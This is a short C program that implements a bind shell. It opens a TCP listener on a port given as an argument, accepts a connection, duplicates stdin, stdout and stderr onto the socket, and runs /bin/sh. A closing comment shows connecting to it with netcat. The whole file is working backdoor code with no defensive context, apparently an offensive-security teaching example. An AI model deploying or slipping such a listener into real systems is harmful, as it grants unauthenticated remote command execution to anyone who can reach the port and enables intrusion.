#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>

#define BACK_LOG 0
#define TCP_PROTO_ID 6

// print error message
void printe(char *msg) {
    perror(msg);
    exit(0);
}

int main(int argc, char const *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s port\n", argv[0]);
        return 0;
    }
    // create a TCP socket
    int listen_sock = socket(PF_INET, SOCK_STREAM, TCP_PROTO_ID);
    if (listen_sock == -1) {
        printe("Socket create failed!");
    }
    // initialize bind's 2nd argument
    struct sockaddr_in server_addr, client_addr;
    server_addr.sin_family = PF_INET;         // use internet domain socket
    server_addr.sin_addr.s_addr = INADDR_ANY; // IP addr of the server machine
    server_addr.sin_port = htons(atoi(argv[1])); // get port from argv
    // bind listen_sock to 0.0.0.0:12345
    if (bind(listen_sock, (struct sockaddr *)&server_addr,
             sizeof(server_addr)) == -1) {
        printe("Binding Error!");
    }
    // listen socket
    // if the listen_sock is valid, this function can't fail
    if (listen(listen_sock, BACK_LOG) == -1) {
        printe("Not Listening!");
    }
    // create accept socket
    uint client_len = sizeof(client_addr);
    int conn_sock =
        accept(listen_sock, (struct sockaddr *)&client_addr, &client_len);
    if (conn_sock == -1) {
        printe("Accept Failed!");
    }
    // display client info
    printf("Recv connection from %s:%d\n", inet_ntoa(client_addr.sin_addr),
           client_addr.sin_port);
    // dup stdin, stdout and stderr to conn_sock
    dup2(conn_sock, 2);
    dup2(conn_sock, 1);
    dup2(conn_sock, 0);
    // create shell
    execve("/bin/sh", NULL, NULL);
    // open another shell, type "nc localhost 12345" and get shell from server
    return 0;
}